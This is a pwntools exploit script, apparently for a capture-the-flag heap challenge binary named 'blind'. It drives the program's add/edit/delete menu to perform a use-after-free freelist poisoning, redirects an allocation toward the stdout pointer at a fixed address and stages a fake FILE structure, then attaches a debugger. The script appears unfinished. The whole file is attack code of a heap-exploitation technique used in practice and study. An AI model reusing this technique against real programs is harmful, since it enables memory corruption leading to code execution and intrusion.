
from pwn import *
context.log_level='debug'

sh = process('./blind')
elf = ELF('./libc.so.6')

def new(idx,content):
    sh.sendline('1')
    sh.recvuntil('Index:')
    sh.sendline(str(idx))
    sh.recvuntil('Content:')
    sh.send(content)
    sh.recvuntil('Choice:')

def edit(idx,content):
    sh.sendline('2')
    sh.recvuntil('Index:')
    sh.sendline(str(idx))
    sh.recvuntil('Content:')
    sh.send(content)
    sh.recv()

def delete(idx):
    sh.sendline('3')
    sh.recvuntil('Index:')
    sh.sendline(str(idx))
    sh.recvuntil('Choice:')


new(0,'aaaaaaaa\n')
new(1,'bbbbbbbb\n')

delete(1)
delete(0)

stdout_addr = 0x602020
edit(0,p64(stdout_addr-3-0x28)+'\n')
new(2,'ccc\n')


fake_file_addr = 0x602050
new(3,p64(fake_file_addr)+'aaaa'+'\n')

gdb.attach(sh)
sh.interactive()
